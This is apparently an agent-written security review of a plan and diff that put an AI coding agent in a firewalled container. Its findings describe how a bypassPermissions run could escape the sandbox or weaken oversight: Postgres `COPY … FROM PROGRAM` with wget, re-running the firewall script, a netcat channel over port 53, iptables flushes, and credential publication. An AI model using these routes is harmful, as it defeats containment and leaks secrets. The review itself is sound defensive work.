# B1.58 review

## Plan review (round 1)

SCOPE: tooling (no §; `scripts/agent/`, `.devcontainer/runner/`). Plan at `cc1c862`. Read: card B1.58, B1.44
plan/review (sandbox deferrals), B1.42 spike, B1.47 plan, `run.sh`, `run-smoke.sh`, `.devcontainer/*`,
`docker-compose.yml`, `compose-smoke.sh`, `scripts/ci/lib.sh`, `tier.sh`, D-19, D-25..D-28.

Probes run (none on the tree, none on the live database):

- `scripts/next-task.sh --check B1.58` → `[next-task] B1.58: no overlap with any Doing or Review card` (exit 0)
- `scripts/agent/tier.sh backlog/work/B1.58/plan.md` → `high`; `plan-files.sh --file` → 11 tokens, all in the table
- `npm view @anthropic-ai/claude-code time`: 2.1.303 published 2026-10-18T21:15Z (15 days), 2.1.309 2026-10-22 (11
  days); 2.1.303 ships the native binary as `optionalDependencies` (`claude-code-linux-arm64` etc.) from the registry
- Throwaway `postgres:17-alpine` (not `level-up-lab-postgres-1`): as `postgres` over TCP,
  `COPY o FROM PROGRAM 'wget -q -T 5 -O - https://example.com; id -un'` returned example.com's HTML and `postgres`
- `docker compose config` on a scratch copy with a stand-in runner overlay: dev overlay and runner overlay both
  resolve `pnpm-store` to `level-up-lab_pnpm-store`; `runner` and `postgres` share network `default`
- `tier.sh` on a scratch plan listing only `.devcontainer/runner/init-firewall.sh` and `Dockerfile` → `low`; both
  paths fail `CONFIG_PROTECTED`
- `gh repo view --json visibility` → `PUBLIC`

| Check                                                                | Result                                                                                                                                                  |
| -------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| every file belongs to the card                                       | pass. 4 new `.devcontainer/runner/*`, `run.sh`, `run-smoke.sh`, new `sandbox-probe.sh`, `scripts/CLAUDE.md`, 3 work files; none owned by B1.55 or B1.49 |
| interfaces follow `ts-style.md`; mutations in actions; Prisma in lib | n/a (no `src/`); bash 3.2 stated for run-smoke. `--mode` signature and S1–S6 pasted                                                                     |
| follows `advice.md` or states the deviation                          | pass. "Advisor skipped (tier quick)". Deviation from the card's named Linux build (`claude-code-vm`) is not stated (reason 6)                           |
| ≤ 7 criteria, measurable Thens                                       | pass. 4 Acceptance clauses, each mapped to S1–S6 or R15. The cost paragraph understates two exposures (reasons 1, 3)                                    |
| verification: exact commands, expected numbers                       | fail, minor: `pnpm lint && pnpm typecheck && pnpm test` "green" has no count (reason 7). The rest has numbers (15, 9, 6/6, 6/6)                         |
| skeleton → red → green → map → review                                | pass for tooling: red `test(scripts)`, green `chore(scripts)`, review `docs(backlog)`; no skeleton or map row without a §, as B1.44                     |
| `Lead approves spec` box                                             | n/a. No spec section (tooling, D-26, D-27). `Plan approved by:` empty; I write neither                                                                  |
| no settled D-n contradicted                                          | pass. D-19 label named, D-28 tier high matches `tier.sh`. D-28 has no row for `.devcontainer/` (reason 4)                                               |
| `next-task.sh --check B1.58`                                         | pass: "B1.58: no overlap with any Doing or Review card"                                                                                                 |

Verdict: changes requested

1. **The allowed Postgres is a way around the firewall** (confirmed). The plan allows "the compose network (Postgres)"
   and sets `DATABASE_URL` to `postgres:5432` with the compose superuser `postgres`/`postgres`. A
   `bypassPermissions` run in `runner` can send `COPY … FROM PROGRAM '<any shell>'` to it. That runs as the OS user
   `postgres` in `level-up-lab-postgres-1`, a container with no firewall. My probe on a throwaway copy fetched
   example.com that way. The same login can drop every worktree schema in the shared `pgdata`. Allowing the
   compose subnet also lets the run reach every other container in project `level-up-lab` (`app`, when the dev
   container is up). None of the card's Acceptance needs a database: `--check-binary` uses only `git worktree add`.
   Fix: give `runner` no database access in B1.58 (no `DATABASE_URL`, no compose-subnet rule) and leave the DB
   question to B1.59, or use a role without superuser and without `pg_execute_server_program`. Either way, add an
   S-probe proving the database route is closed (refused, or `COPY … PROGRAM` denied).
2. **The pnpm store is shared with the unsandboxed dev container** (confirmed via compose config). `pnpm-store`
   without a `runner-` prefix resolves to the same `level-up-lab_pnpm-store` volume that `.devcontainer/` mounts.
   The dev container runs as root and has the docker socket (`docker-outside-of-docker`). Once a run in the sandbox
   can write to that store, the store is a write channel to the next `pnpm install` in that container. The ownership
   also differs (root writes, `node` reads), so the runner's `pnpm install` can hit EACCES. Fix: a separate
   `runner-pnpm-store` volume, and S6 extended so that no volume is shared with `app`.
3. **The stated exfiltration cost understates the exposure** (confirmed: the repo is PUBLIC). The Claude login lives
   in volume `runner-claude`, and the gh token is in the same user's home. Both are readable by a
   `bypassPermissions` run as `node`. Pushing either one to a branch of this repository publishes it. The proposed
   mitigation, "a fine-grained token for this repo only", does not prevent that: pushing branches to this repo is
   exactly what the token is for. The lead must see this before approving. Either state it in Costs (the lead's
   Claude credential and gh token are readable by a run and can be published through this public repo), or reduce it
   in the plan: no push scope until B1.59, or credentials the run cannot read. The second option is likely B1.59's.
4. **Deferring `.devcontainer/` protection opens a window with B1.55** (confirmed). `tier.sh` rates a plan that
   changes only `.devcontainer/runner/init-firewall.sh` or the `Dockerfile` (the sudoers line) as `low`, and
   `check-config-change.sh` asks for no label. After B1.55, a reviewed low-tier `agent-ready` plan passes without
   the lead. So an agent could widen its own firewall with no human in the loop. Fix: add `\.devcontainer/.*` to
   `CONFIG_PROTECTED` in `scripts/ci/lib.sh` here (lib.sh is not in B1.55's set; add a T-probe), or state the window
   and make the follow-up card block B1.55's merge.
5. **The probes do not falsify two of the plan's own claims.** (a) S5 "`iptables -F` refused without sudo" passes
   for any non-root user, including one with `NOPASSWD: ALL`. The claim is "sudo only for firewall", so the probe
   must be `sudo -n iptables -F` and `sudo -n true` refused, with `sudo -n init-firewall.sh` the only allowed entry.
   It must also show the script takes no arguments or environment that change its rules. (b) R15 runs only where
   the marker is absent, so the two `curl` conjuncts of `sandboxed()` are never shown to matter. A mutant that drops
   them survives every probe. Add an in-container probe: with a `curl` that reports example.com reachable, or
   api.github.com unreachable, `run.sh --mode` prints `dontAsk`. If `run.sh` calls curl by absolute path, a PATH
   shim cannot reach it; then say how the negative case is shown. (c) Plausible: the plan names only
   `iptables`/`ipset`. If the compose network ever has IPv6, egress over v6 is unfiltered and S1 tests only v4.
   Set `ip6tables` default DROP, or have S1 assert there is no global v6 route.
6. **Pins and the named build are deviations the plan does not call deviations.** The orchestrator's constraint is
   "versions pinned and at least two weeks old". `node:24-bookworm` is a floating tag, so its age cannot be shown,
   and the 8 apt packages take whatever bookworm serves at build time. Only `claude@2.1.303` is pinned (15 days,
   verified above). Either pin the base by digest (CI keeps its tag, or record why the two may differ) or put "base
   and apt are not pinned" in the lead's decision 2 as a deviation. Separately, the card (via B1.47) names the Linux
   build `claude-code-vm`, the desktop app's aarch64 ELF (B1.42 spike). The plan installs the npm package instead.
   That is a defensible choice (pinned, no host path bound in), but it must be stated as a deviation from the card.
7. **What persists, and what the run can rewrite, is not stated** (plausible). Volumes are `runner-repo`,
   `runner-claude` and `pnpm-store`. `~/.config/gh` and `RUNS` (`~/.level-up-lab/runs`, including
   `verified-versions`) are not on a volume. So every `up --build` loses the gh login and the verified version, which
   means a new paid `--check-binary`, and B1.59's `stopped` marks would not survive. B1.44's review (pass 3, finding 1
   disposition) deferred "keeping `runs/verified-versions` out of a run's reach" to this card. The plan does not
   mention it. In the container, `run.sh`, `verified-versions` and the clone stay writable by the run, so only the
   image (root-owned binary, marker, firewall script, sudoers) is fixed. State that, or move `RUNS` out of the run's
   reach. Also give `pnpm test`'s expected count in Verification.

Not blocking, for the lead: the plan is 73 lines against planning.md's ≈ 40 (B1.44 was longer). `runner`
joins project `level-up-lab`, so a `docker compose up -d --remove-orphans` from the base file alone would delete it,
and a `shutdownAction: stopCompose` in the new `devcontainer.json` would stop the shared Postgres. Settle both in the
diff. The plan's claim that `--disallowedTools` still holds under `bypassPermissions` has no probe. The init check
and `--check-binary` (run under the chosen mode) cover hooks only.

## Plan review (round 2)

SCOPE: tooling (no §; `.devcontainer/runner/`, `scripts/agent/`, `scripts/ci/lib.sh`). Plan at `0f0beac` (77 lines).
Read: cards B1.58 and B1.59, round 1 above, `run.sh`, `run-smoke.sh`, `tier.sh`, `tier-smoke.sh`, `scripts/ci/lib.sh`,
`check-config-change.sh`, `next-task.sh` (claim), `.devcontainer/*`, `docker-compose.yml`, `compose-smoke.sh`,
`worktree.sh` (install step), `package.json`, D-19, D-27, D-28.

Probes run (read-only, nothing on the tree):

- `scripts/next-task.sh --check B1.58` → `[next-task] B1.58: no overlap with any Doing or Review card` (exit 0)
- `scripts/agent/tier.sh backlog/work/B1.58/plan.md` → `high`; `plan-files.sh --file` → 11 tokens, all in the table
- `pnpm test` → `Tests 202 passed (202)` (the plan's number holds); `run-smoke.sh` → `14 probes OK`;
  `tier-smoke.sh` → `9 probes OK`
- `npm view @anthropic-ai/claude-code time`: 2.1.303 2026-10-18 (15 days), 2.1.304 2026-10-19 (14 days)
- `nodejs.org/dist/index.json`: v24.22.0 2026-10-14 `security=false`, **v24.22.1 2026-10-20 `security=true`**,
  v24.22.2 2026-10-27
- Docker Hub `library/node` tags: `24.22.0-bookworm` `tag_last_pushed` **2026-10-21T05:41Z** (12 days);
  `24.22.1-bookworm` re-pushed 2026-10-28
- `worktree.sh:101` runs `pnpm install --frozen-lockfile`; `package.json` builds `@prisma/engines` and `prisma`
  (`onlyBuiltDependencies`), Prisma 6.19.3

Round 1 reasons:

| r1  | Status in round 2                                                                                                                                               |
| --- | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | addressed. A separate project with no Postgres; S1 refuses `host.docker.internal:5433`, S7 finds no `postgres` host                                             |
| 2   | addressed. `runner-pnpm-store` in project `level-up-lab-runner`, no volume shared with `app`; the orphan and `stopCompose` notes are moot                       |
| 3   | addressed. Costs says the login and the gh token are readable and can be published through the public repo; mitigation is revocation                            |
| 4   | addressed. `\.devcontainer/.*` in `CONFIG_PROTECTED`, T3 probe. D-28 names "the protected list", so this extends it without a new D-n                           |
| 5   | (b) and (c) addressed (S4 curl shim both ways, R15 uname shim; ip6tables DROP, S1 `-6`). (a) half: S5 adds `sudo -n` but not the re-run or arguments (reason 1) |
| 6   | stated as deviations, but the Node pin's facts do not hold (reason 3)                                                                                           |
| 7   | addressed: volumes listed, `pnpm test` 202. The "gains nothing" sentence overstates (reason 5)                                                                  |

| Check                                                                | Result                                                                                                                                      |
| -------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| every file belongs to the card                                       | pass. 4 new `.devcontainer/runner/*`, 4 `scripts/agent/*`, `scripts/ci/lib.sh`, `scripts/CLAUDE.md`, work files; none is B1.55's or B1.49's |
| interfaces follow `ts-style.md`; mutations in actions; Prisma in lib | n/a (no `src/`). `--mode`, S1–S7 and the compose command pasted                                                                             |
| follows `advice.md` or states the deviation                          | pass. "Advisor skipped (tier quick)"; the `claude-code-vm` deviation is stated                                                              |
| ≤ 7 criteria, measurable Thens                                       | pass. 4 Acceptance clauses mapped to S1–S7, R15, T3. Two costs still understated (reasons 4, 5)                                             |
| verification: exact commands, expected numbers                       | pass with a gap. 15/15, 9/9, 202, 6/6, 7/7. `devcontainer.json` is never exercised (reason 6)                                               |
| skeleton → red → green → map → review                                | pass for tooling, as B1.44: red `test(scripts)`, green `chore(scripts)`, review `docs(backlog)`                                             |
| `Lead approves spec` box                                             | n/a (no section). `Plan approved by:` empty; I write neither                                                                                |
| no settled D-n contradicted                                          | pass. D-19 label named, D-28 high matches `tier.sh`                                                                                         |
| `next-task.sh --check B1.58`                                         | pass: "B1.58: no overlap with any Doing or Review card"                                                                                     |

Verdict: changes requested

1. **The firewall script stays runnable by the run, and only its start is probed** (r1 5(a) residue; the gap is
   confirmed in the plan text, the open window is plausible). "sudoers 1 cmd" leaves
   `node NOPASSWD: init-firewall.sh` in place after start, so a `bypassPermissions` run can call it again at any
   time. Trigger: `sudo -n /usr/local/bin/init-firewall.sh & sleep 0.5; curl https://example.com`. A script that
   resets policies to ACCEPT before it flushes and fetches `api.github.com/meta` opens egress for that window. A
   script that keeps DROP fails on the fetch and leaves the container with no allow rules. S5 tests neither case,
   and the round 1 ask that the script take no arguments or environment that change its rules is not in the plan.
   Fix, either: (a) no sudo in the image; the start command runs as root, applies the firewall, then drops to
   `node` with `setpriv`, and the lead and B1.59 enter with `docker exec -u node`. Or (b) a sudoers entry with
   `""` (no arguments), and a first line that refuses a second run before any flush (a root-owned mark in `/run`).
   Either way S5 must add: a second `sudo -n init-firewall.sh` (or "sudo absent") leaves example.com refused and
   api.github.com reachable, checked both during the call and after it.
2. **"DNS stays open" does not name a destination** (plausible). The common pattern, Anthropic's reference script
   included, is `-p udp --dport 53 -j ACCEPT` with no `-d`. That rule is a raw UDP (or TCP) channel to any IP on
   port 53, not only DNS. Trigger: `printf data | nc -u -w1 <any IP> 53` leaves the container. On the compose
   network the resolver is `127.0.0.11`, which is loopback, so no external rule for 53 is needed. Fix: allow 53 only
   to `127.0.0.11`, and add to S1 that `dig @1.1.1.1 example.com` is refused. Then Costs can say exactly what stays
   open: tunnelling through Docker's resolver.
3. **The Node pin skips a security release, and the tag is younger than two weeks** (confirmed). v24.22.1
   (2026-10-20, 13 days old) is flagged `security=true` in nodejs.org's index. The pinned v24.22.0 lacks those
   fixes, and the plan does not say so. The tag `node:24.22.0-bookworm` was last pushed on 2026-10-21, so the bits
   it serves today are 12 days old, not the 19 the plan implies, and Docker re-pushes these tags. Fix: pin by digest
   (`node:24.22.0-bookworm@sha256:…`) with the digest's push date, and put in decision 2, for the lead: "24.22.1 is a
   security release 13 days old; the 14-day rule keeps it out until 2026-11-03". Either take 24.22.1 on that date or
   accept the gap. Also, for the lead: bookworm's `gh` 2.23 is from 2023.
4. **The full issue run is deferred to a card that does not hold it** (the card text is confirmed; the install
   failure is plausible). The plan says Prisma engines and Playwright are "B1.59's". B1.59's Acceptance is a
   launchd plist that runs `run.sh --poll` inside this container. It names no wider allow list and no offline cache.
   Trigger: any `run.sh <issue>` inside → `worktree.sh:101` `pnpm install` → `@prisma/engines`' build fetches from
   `binaries.prisma.sh`, which is refused. So once B1.59 lands, every unattended tick fails at setup. Fix: name the
   card that widens the list or adds the cache (amend B1.59 through the filing lane, or file a new card that B1.59
   depends on), and say in Costs that after B1.58 only `--check-binary` works inside.
5. **Decision 1's costs are not all stated** (plausible). (a) The host and the container each keep their own
   `RUNS` (locks, `stopped` marks) and their own local branches. `next-task.sh --claim` and `in_flight` see the other
   side only after a push or a PR. Until B1.59 the lead can start the same issue on both sides, which gives two
   runs and two `chore/<card>-agent` branches racing to reach origin. (b) "It gains nothing the firewall does not
   still bound" is too strong. The volumes carry a run's writes into every later run: the clone's `.git/hooks` and
   `.git/config` are shared by every later worktree, `verified-versions` is in `runner-runs`, and user-level files
   are in `runner-claude`. So one compromised run can taint the branches of later runs until the volumes are wiped.
   The firewall bounds destinations, not the integrity of later PRs. State both, or recreate `runner-repo` for each
   run.
6. **`devcontainer.json` is in Files but no Verification step uses it** (plausible). The lead's steps use the
   compose `up` command. If the lead opens the runner from VS Code, its server and extension downloads go to hosts
   the allow list refuses (`update.code.visualstudio.com`, `marketplace.visualstudio.com`, `*.vscode-cdn.net`). The
   firewall is already up when VS Code attaches, so the attach can fail. Fix: drop the file (the compose project
   meets the Acceptance), or add an "open in VS Code" step with its expected result and state any host it needs.

Not blocking, for the lead: the plan is 77 lines against planning.md's ≈ 40. The red runs on the host, while the
card says "from the container today"; the host is a stricter red, but say so. Set `CLAUDE_CONFIG_DIR` to the
mounted dir so that `~/.claude.json` persists with the credentials. The `uname` conjunct of `sandboxed()` has no
probe that tells it apart, because the marker already fails on the host; that is redundancy, not a gap.
`--disallowedTools` under `bypassPermissions` stays [unverified], as the plan says. Per the reviewer's rules, a
third round goes to "Waiting on human": each reason above is a stated cost or a one-line fix that the lead can settle
at the gate.

## Diff review (pass 1)

SCOPE: all (tooling: `.devcontainer/runner/`, `scripts/agent/`, `scripts/ci/lib.sh`; no `src/`, `prisma/`, `e2e/`
change). Range `origin/main...HEAD` (12 files). Container never built or started by anyone: everything about
`Dockerfile`, `init-firewall.sh` and `sandbox-probe.sh` inside the container below is judged by reading and is
[unverified].

### Commands (run by the reviewer, host macOS)

| Command                                                          | Last line                                                                                                 |
| ---------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| `pnpm lint`                                                      | `All matched files use Prettier code style!`                                                              |
| `pnpm typecheck`                                                 | `> tsc --noEmit` (exit 0)                                                                                 |
| `pnpm test`                                                      | `Tests  202 passed (202)`                                                                                 |
| `pnpm test:e2e`                                                  | `43 passed (1.2m)`                                                                                        |
| `pnpm test:mutation`                                             | `Final mutation score of 93.40 is greater than or equal to break threshold 70`                            |
| `scripts/ci/check-suppressions.sh`                               | `OK: no new suppressions`                                                                                 |
| `scripts/ci/check-config-change.sh`                              | exit 1: 8 protected files without `config-change-approved` (expected: label at PR, D-19, plan decision 4) |
| `scripts/ci/check-feat-commits.sh`                               | `OK: no feat commit touches tests`                                                                        |
| `scripts/ci/check-ac-coverage.sh`                                | `OK: every criterion of a shipped section has a test`                                                     |
| `scripts/ci/check-spec-sections.sh`                              | `OK: sections cited: 1 … 22`                                                                              |
| `scripts/ci/check-features-map.sh`                               | `OK`                                                                                                      |
| `scripts/ci/check-plan-scope.sh`, `check-backlog.sh`             | `OK: … stays inside the approved plan of B1.58`, `OK: README matches the cards`                           |
| `scripts/verify-red.sh B1.58`                                    | exit 1 `no 'test(<pkg>): B1.58 … (red)' commit` (expected for a shell-only red, B1.45 precedent)          |
| `scripts/verify-red.sh --auto`, also with `BASE_SHA=origin/main` | `nothing to verify`, exit 0 (CI's shape)                                                                  |
| `scripts/agent/run-smoke.sh` · `tier-smoke.sh`                   | `15 probes OK` · `9 probes OK`                                                                            |
| `scripts/agent/sandbox-probe.sh` (host)                          | `6 of 7 probes FAILED` (S2 only ok): the host red still holds                                             |
| `scripts/next-task.sh --check B1.58`                             | `B1.58: no overlap with any Doing or Review card`                                                         |
| `git diff --stat origin/main...HEAD`                             | `12 files changed, 683 insertions(+), 15 deletions(-)`                                                    |

### Checklist

| Check                                                      | Result                                                                                                                                                                                                                                                                                                                                |
| ---------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| every acceptance clause has a probe                        | pass by text: firewall both ways S1/S2 + entrypoint self-check; pin S3 + `--check-binary`; login S6; bypass only here S4 + R15. All in-container probes [unverified]                                                                                                                                                                  |
| no test changed after the red without a `test(...)` commit | `0258b7f test(scripts): B1.58 S5 judges CapEff and NoNewPrivs` loosens S5 (CapBnd 0 → CapEff 0 ∧ NoNewPrivs 1), explained, but landed before the plan change and is not re-approved: finding 1. No merge commits in range                                                                                                             |
| green commit touches no probe file                         | pass: `52fe21a` touches no `*-smoke.sh`, no `sandbox-probe.sh`                                                                                                                                                                                                                                                                        |
| every changed file in `plan.md` Files                      | pass (10 rows cover all 12 files)                                                                                                                                                                                                                                                                                                     |
| interfaces match the plan                                  | fail: compose `cap_drop`/`cap_add` SETUID/SETGID/SETPCAP/`no-new-privileges` and S5 are outside the approved Interfaces; awaits the lead (finding 1)                                                                                                                                                                                  |
| Zod / Prisma / raw SQL / migration                         | n/a (no `src/`, `prisma/`)                                                                                                                                                                                                                                                                                                            |
| no secret, no suppression                                  | pass: build context is `.devcontainer/runner/` (Dockerfile + script only); no credential at build time                                                                                                                                                                                                                                |
| features map row                                           | n/a (tooling, no §)                                                                                                                                                                                                                                                                                                                   |
| would a test fail if one changed line were reverted        | probed on a scratch clone, run-smoke only (host): dropping the marker conjunct → R15 FAIL; dropping the uid conjunct, the uname conjunct, the example.com refusal, or hard-coding `dontAsk` in `run_issue` → 15/15 still. The curl conjuncts are covered by S4 in the container [unverified]; the uid conjunct by nothing (finding 2) |

### Findings

```
[1] KIND: plan-mismatch
    WHERE: .devcontainer/runner/docker-compose.yml:20-22, scripts/agent/sandbox-probe.sh:65-66 (0258b7f)
    DEFECT: the build went green on an interface the lead has not approved: S5 loosened from "CapBnd 0" to
            "CapEff 0 and NoNewPrivs 1", and the compose file adds SETUID/SETGID/SETPCAP and no-new-privileges,
            with the plan amended (8f7be7b) only after the green commit (52fe21a).
    TRIGGER: `docker compose -f .devcontainer/runner/docker-compose.yml exec runner <cmd>` with no `-u node` (the
            default, since the Dockerfile sets no USER): the process is root with NET_ADMIN in its effective set
            and can run `iptables -P OUTPUT ACCEPT; iptables -F`. The approved S5 (empty bounding set) would have
            ruled this out for every process; the loosened S5 holds only for execs that remember `-u node`.
    WRONG BEHAVIOUR: planning.md says stop, re-plan and get re-approval, then continue. Here the code continued
            first. The amended plan also does not offer the lead the design that keeps the approved S5: a separate
            `firewall` service holding NET_ADMIN that applies the rules, and `runner` with
            `network_mode: service:firewall`, `cap_drop: [ALL]` and no `cap_add`. Then CapBnd is 0 for every exec,
            root included, and B1.59's launchd line cannot drop the firewall by forgetting `-u node`.
    CONFIDENCE: confirmed (commit order and plan text traced). The sidecar alternative is plausible: not built.
[2] KIND: coverage
    WHERE: scripts/agent/run.sh:52 (`"$(id -u)" != 0` in sandboxed()); scripts/agent/sandbox-probe.sh S4
    DEFECT: the uid conjunct is the only thing that keeps a root exec in the container out of bypassPermissions,
            and no probe fails when it is removed.
    TRIGGER: on a scratch clone, delete ` && "$(id -u)" != 0` from sandboxed(): run-smoke prints 15 probes OK.
            In the container S4 runs as node and shims only curl, so it passes as well. A regression there followed by
            `docker compose exec runner scripts/agent/run.sh <n>` (root, the default) gives a run with
            bypassPermissions and NET_ADMIN.
    WRONG BEHAVIOUR: the card says bypass "only when it detects this firewalled container"; a root process
            inside it is not held by the firewall (finding 1), yet no test pins it to dontAsk.
    CONFIDENCE: confirmed (mutation run on the copy). Fix for test-writer: S4 adds an `id` shim that prints 0 (and
            a `uname` shim that prints Darwin) and expects dontAsk.
[3] KIND: correctness
    WHERE: .devcontainer/runner/docker-compose.yml:5-11 (the lead's commands); backlog/work/B1.58/pr-body.md
    DEFECT: the lead's verification clones `main`, where `scripts/agent/sandbox-probe.sh` does not exist and
            `run.sh --check-binary` hard-codes `--permission-mode dontAsk`.
    TRIGGER: run the header's commands verbatim before merge: `git clone …level-up-lab.git .` then
            `scripts/agent/sandbox-probe.sh` gives "No such file or directory". `scripts/agent/run.sh --check-binary` passes
            under dontAsk (origin/main run.sh:225), so it proves nothing about the hook under bypassPermissions.
    WRONG BEHAVIOUR: the plan says "exact commands in the PR body" and the AC evidence ("--check-binary passes
            inside") must come before merge. The PR body has no commands, and the header's commands collect the
            evidence from the wrong code. Fix: after the push, add `git checkout chore/B1.58-sandbox` to the
            pre-merge steps and copy them into the PR body. Also refresh the PR body's Plan copy: it still says
            "CapBnd 0" and "Plan approved by:" blank, and it has no "Changed after approval" block.
    CONFIDENCE: confirmed (`git show origin/main:scripts/agent/sandbox-probe.sh` → not in origin/main;
            origin/main run.sh:203,225).
```

### Not blocking, for the lead (answers to the dev-lead's six doubts, all [unverified] until the lead's `up`)

1. iptables-nft, ipset, `-m state` with cap_drop ALL + NET_ADMIN/NET_RAW: this is the same toolset Anthropic's
   reference devcontainer uses on Docker Desktop's kernel. If it fails, the script runs under `set -e` and the
   container exits (fail-closed).
2. setpriv under no-new-privileges: NNP gates only execve gains, not setresuid/PR_CAPBSET_DROP. util-linux sets
   KEEPCAPS and restores effective caps across the uid change, and SETPCAP is present. A failure here exits PID 1,
   so this also fails closed.
3. Docker builds an exec's process from the container's OCI spec, so NoNewPrivileges and the bounding set carry
   over. For uid ≠ 0, execve leaves CapEff 0. S5 measures both at run time.
4. `claude auth login` (claude.ai, platform/console, api.anthropic.com) and `gh auth login` (github.com device flow)
   fall inside the list. corepack fetches pnpm from registry.npmjs.org. Prisma engines and Playwright do not
   (B1.62, stated).
5. R6 is a lint, not proof: it catches a second literal `bypassPermissions` but not a computed mode. The behaviour
   proof is R15 on the host plus S4 inside, and S4 lacks the uid case (finding 2).
6. DNS: flushing filter only leaves Docker's nat DNAT for 127.0.0.11, and `-o lo` covers it. The open risk is where
   dockerd sends the upstream query from. If it goes out from the container's netns (older engines), it hits
   REJECT, the self-check `curl https://api.github.com` fails, and the container exits. That is fail-closed, but
   the runner is then unusable. Engine here: 29.9.2.

Other notes: PID 1 is `sleep` with no `init: true`, so orphans of runs are never reaped and `down` waits 10 s for
SIGKILL. `gh auth setup-git` writes `~/.gitconfig`, which no volume holds, so it is lost on a recreate. There is no
git identity in the image, so `run.sh <issue>` cannot commit inside until someone sets one (B1.59/B1.62's concern,
because only `--check-binary` is in scope here).

Verdict: back to test-writer (finding 2), then the lead's re-approval of the changed plan (finding 1, with the
sidecar alternative stated). The dev-lead fixes the lead's commands and the PR body (finding 3).

Riskiest unfalsified: whether init-firewall.sh starts at all on Docker Desktop. That depends on DNS forwarding
through 127.0.0.11 with OUTPUT open only on lo, and on setpriv dropping the bounding set. Both fail closed, and
nobody has run either.

## Diff review (pass 2)

SCOPE: all (tooling: `.devcontainer/runner/`, `scripts/agent/`, `scripts/ci/lib.sh`; no `src/`, `prisma/`, `e2e/`
change). Range `origin/main...HEAD` (12 files), pass-1 fixes `23e7f63`, `5057810`, `53a74f8`, `b0a3f6e`. The runner
image was not built by anyone. To check the compose mechanics I ran a throwaway stand-in project (`bash:5.2`,
project `b158-review-probe`, removed afterwards with `down -v`) with the same `firewall`/`runner` shape: `user: root`,
`init`, `cap_drop ALL` + NET_ADMIN/NET_RAW, `no-new-privileges`, the same `test -e /run/…` healthcheck,
`network_mode: service:firewall`, `depends_on: service_healthy`. Anything that needs the real image is [unverified].

### Commands (run by the reviewer, host macOS, engine 29.9.2)

| Command                                                               | Last line                                                                                        |
| --------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
| `pnpm lint`                                                           | `All matched files use Prettier code style!`                                                     |
| `pnpm typecheck`                                                      | `> tsc --noEmit` (exit 0)                                                                        |
| `pnpm test`                                                           | `Tests  202 passed (202)`                                                                        |
| `pnpm test:e2e`                                                       | `43 passed (52.5s)`                                                                              |
| `pnpm test:mutation`                                                  | `Final mutation score of 93.40 is greater than or equal to break threshold 70`                   |
| `scripts/ci/check-suppressions.sh`                                    | `OK: no new suppressions`                                                                        |
| `scripts/ci/check-config-change.sh`                                   | lists 8 protected files, last `scripts/ci/lib.sh` (expected: label at PR, D-19, plan decision 4) |
| `scripts/ci/check-feat-commits.sh`                                    | `OK: no feat commit touches tests`                                                               |
| `scripts/ci/check-ac-coverage.sh`                                     | `OK: every criterion of a shipped section has a test`                                            |
| `scripts/ci/check-spec-sections.sh`                                   | `OK: sections cited: 1 … 22`                                                                     |
| `scripts/ci/check-features-map.sh`                                    | `OK`                                                                                             |
| `scripts/ci/check-plan-scope.sh`, `check-backlog.sh`                  | `OK: … stays inside the approved plan of B1.58`, `OK: README matches the cards`                  |
| `scripts/verify-red.sh B1.58`                                         | `no 'test(<pkg>): B1.58 … (red)' commit` (shell-only red, as in pass 1)                          |
| `scripts/verify-red.sh --auto` (`BASE_SHA=origin/main`)               | `nothing to verify`                                                                              |
| `scripts/agent/run-smoke.sh` · `tier-smoke.sh`                        | `15 probes OK` · `9 probes OK`                                                                   |
| `scripts/agent/sandbox-probe.sh` (host)                               | `6 of 7 probes FAILED` (the host red still holds)                                                |
| `docker compose -f .devcontainer/runner/docker-compose.yml config -q` | exit 0                                                                                           |
| `scripts/next-task.sh --check B1.58`                                  | `B1.58: no overlap with any Doing or Review card`                                                |
| `git diff --stat origin/main...HEAD`                                  | `12 files changed, 887 insertions(+), 15 deletions(-)`                                           |

### Pass 1 findings

| #   | Closed? | Evidence                                                                                                                                                                                                                                                                      |
| --- | ------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | yes     | `runner`: `cap_drop: [ALL]`, no `cap_add`, NNP, `network_mode: service:firewall`. Stand-in: `exec -u root runner` reads `CapEff 0`, `CapBnd 0`, `NoNewPrivs 1`; runner's `/etc/resolv.conf` is `nameserver 127.0.0.11` (shared netns, Docker's DNS). S5 is back to `CapBnd` 0 |
| 2   | yes     | traced: S4's `id` shim prints 0 for `-u`, so `sandboxed()` fails on the uid conjunct alone (all others hold inside); deleting it gives `bypassPermissions` and S4 FAIL. In the container [unverified]; on the host run-smoke still does not pin it (accepted)                 |
| 3   | yes     | header and PR body both `git checkout chore/B1.58-sandbox` after the clone; the PR body's Plan copy equals `plan.md` line for line (only heading levels differ)                                                                                                               |

### Checklist

| Check                                                      | Result                                                                                                                                                                                                                                                               |
| ---------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| every acceptance clause has a probe                        | pass by text (S1–S7, R6, R15, `--check-binary`); in-container [unverified]                                                                                                                                                                                           |
| no test changed after the red without a `test(...)` commit | pass: `0258b7f`, `23e7f63` are `test(scripts)`; `23e7f63` tightens S5 (CapEff → CapBnd) and adds S4 cases; no merge commits in range                                                                                                                                 |
| green/fix commit touches no probe file                     | pass: `5057810` touches only `.devcontainer/runner/*`                                                                                                                                                                                                                |
| every changed file in `plan.md` Files                      | pass (`check-plan-scope` OK; Files unchanged)                                                                                                                                                                                                                        |
| interfaces match the plan                                  | fail on one claim: "(firewall fails → runner never starts)" and "starts only once `firewall` is healthy" hold for the first `up` only (finding 1)                                                                                                                    |
| "Changed after approval" states every change               | every change of `5057810`/`23e7f63` is named (sidecar, user node, caps, NNP, healthcheck, S4 shims, S5, checkout, `GIT_CONFIG_GLOBAL`, `init`). Missing: the cost that `runner-runs` now holds a run-writable global gitconfig (note 2); one claim false (finding 1) |
| Zod / Prisma / raw SQL / migration                         | n/a                                                                                                                                                                                                                                                                  |
| no secret, no suppression                                  | pass                                                                                                                                                                                                                                                                 |
